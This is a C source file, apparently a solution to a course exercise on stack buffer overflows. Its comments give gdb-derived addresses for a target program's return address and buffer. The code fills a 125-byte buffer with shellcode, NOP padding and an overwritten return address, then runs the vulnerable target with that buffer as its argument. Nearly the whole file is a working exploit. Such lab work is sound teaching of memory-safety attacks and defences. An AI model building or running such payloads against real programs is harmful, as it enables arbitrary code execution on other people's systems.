#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

//rip at 0x3021fec8
//0x3021fec8: 0x004009b8
//Therefore, the return address once main completes, is 0x004009b8

//p &buf
//$1 = (char (*) [96]) 0x3021fe50
//Therefore, the address of buf is 0x3021fe50 to 0x3021fe50+96 = 0x3021feb0

//The difference between the rip (program counter) and the address of buf is 0x3021fec8 - 0x3021fe50 = 0x78 = 120
//We need to fill the buffer with 120 bytes of shellcode, and No-OPs
//Then 8 bytes of the return address of buffer (0x3021fe50)

#define BUF_SIZE 125

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char bufferExploit[BUF_SIZE];

	//Fill the first bytes with shellcode
	int i;
	for (i = 0; i < strlen(shellcode); i++) {
		bufferExploit[i] = shellcode[i];
	}

	//Fill the remaining bytes with No-OPs
	for (; i < BUF_SIZE - 5; i++) {
		bufferExploit[i] = 0x90;
	}

	//Fill the last bytes with the return address of buffer
	int *newReturnAddress = (int *)&bufferExploit[BUF_SIZE - 5];
	*newReturnAddress = 0x3021fe50;

	//The bufferExploit string will end with NULL
    	bufferExploit[124] = '\0';

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = bufferExploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
